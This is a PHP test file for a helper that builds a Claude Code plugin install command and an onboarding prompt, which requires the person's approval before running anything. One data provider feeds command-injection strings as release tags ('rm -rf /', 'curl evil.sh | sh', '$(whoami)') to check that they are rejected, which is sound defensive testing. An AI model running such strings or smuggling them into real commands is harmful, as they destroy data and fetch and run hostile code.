<?php

use App\Support\AiToolSetup;

/*
 * RUB-545: the pasted prompt gives Claude Code one command that installs the
 * Artfct plugin (connection plus the onboard skill) and then tells the person
 * the three things only they can do. These tests pin the command, the pin to a
 * reviewed release, and that the slash command it names is the real skill.
 */

function setupPrompt(): string
{
    return (new AiToolSetup('https://example.test'))->agentSetupPrompt();
}

test('the prompt gives Claude Code one install command that needs the person\'s approval first', function () {
    $prompt = setupPrompt();

    expect($prompt)->toContain('If you are Claude Code 2.1.292 or later (check with `claude --version`)')
        ->toContain('Show me this command, and run it only after I approve it')
        ->toContain('claude plugin install artfct --marketplace artfct-dev/artfct-plugin')
        ->toContain('If the command fails (an older version, or my organization limits plugins), carry on with step 2');
});

test('the prompt names the three steps only the person can do, in order, and stops there', function () {
    $prompt = setupPrompt();

    $reload = strpos($prompt, '`/reload-plugins`');
    $authorize = strpos($prompt, '`/mcp` to sign in to `artfct`');
    $onboard = strpos($prompt, '`/artfct:onboard`');

    expect($reload)->not->toBeFalse()
        ->and($authorize)->toBeGreaterThan($reload)
        ->and($onboard)->toBeGreaterThan($authorize)
        ->and($prompt)->toContain('stop there: that skill does the rest of these steps');
});

test('the plugin path replaces the manual steps only for Claude Code and every other app keeps them', function () {
    $prompt = setupPrompt();

    expect($prompt)->toContain('instead of steps 2 and 3')
        ->toContain('Read https://example.test/llms-full.txt and follow the setup section for your app')
        ->toContain('call `get_guidance` with topic `onboarding`')
        ->toContain('Never ask me for a password or a token');
});

test('the install command runs nothing but the plugin install and never needs Node', function () {
    $command = (new AiToolSetup('https://example.test'))->pluginInstallCommand();

    expect($command)->toStartWith('claude plugin install artfct --marketplace ')
        ->not->toContain('npx')
        ->not->toContain('npm')
        ->not->toContain(';')
        ->not->toContain('&&');
});

test('the command installs from the default branch until a release tag is configured', function () {
    config(['services.artfct_plugin.tag' => null]);

    expect((new AiToolSetup('https://example.test'))->pluginInstallCommand())
        ->toBe('claude plugin install artfct --marketplace artfct-dev/artfct-plugin');
});

test('a configured release tag pins the install to it', function (string $tag) {
    config(['services.artfct_plugin.tag' => $tag]);

    expect((new AiToolSetup('https://example.test'))->pluginInstallCommand())
        ->toBe("claude plugin install artfct --marketplace artfct-dev/artfct-plugin#{$tag}")
        ->and(setupPrompt())->toContain("artfct-dev/artfct-plugin#{$tag}");
})->with(['v1.1.0', 'release/2026-11', 'rub-545-onboard-skill']);

test('a tag that is not a plain ref name is ignored instead of put into a command', function (string $tag) {
    config(['services.artfct_plugin.tag' => $tag]);

    $command = (new AiToolSetup('https://example.test'))->pluginInstallCommand();

    expect($command)->toBe('claude plugin install artfct --marketplace artfct-dev/artfct-plugin')
        ->and($tag === '' || ! str_contains($command, $tag))->toBeTrue();
})->with(['v1; rm -rf /', 'v1 && curl evil.sh | sh', '$(whoami)', '`id`', '', '-rf', "v1\nnext", str_repeat('a', 65)]);

test('the marketplace source can be overridden for another environment', function () {
    config(['services.artfct_plugin.marketplace' => 'acme/staging-plugin', 'services.artfct_plugin.tag' => 'v2']);

    expect((new AiToolSetup('https://example.test'))->pluginInstallCommand())
        ->toBe('claude plugin install artfct --marketplace acme/staging-plugin#v2');
});

test('the slash command the prompt names is a real skill the plugin ships', function () {
    $skill = file_get_contents(base_path('skills/onboard/SKILL.md'));
    $sync = file_get_contents(base_path('scripts/plugin/sync-skills.mjs'));

    // `/artfct:onboard` is plugin `artfct` plus the skill name `onboard`.
    expect(setupPrompt())->toContain('/artfct:onboard')
        ->and($skill)->toStartWith("---\nname: onboard\n")
        ->and($sync)->toContain("'onboard'");
});
